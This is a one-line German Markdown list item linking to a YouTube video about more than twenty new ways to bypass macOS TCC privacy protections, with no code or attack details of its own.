* [**Knockout-Sieg gegen TCC - 20+ NEUE Möglichkeiten, Ihre MacOS-Datenschutzmechanismen zu umgehen**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
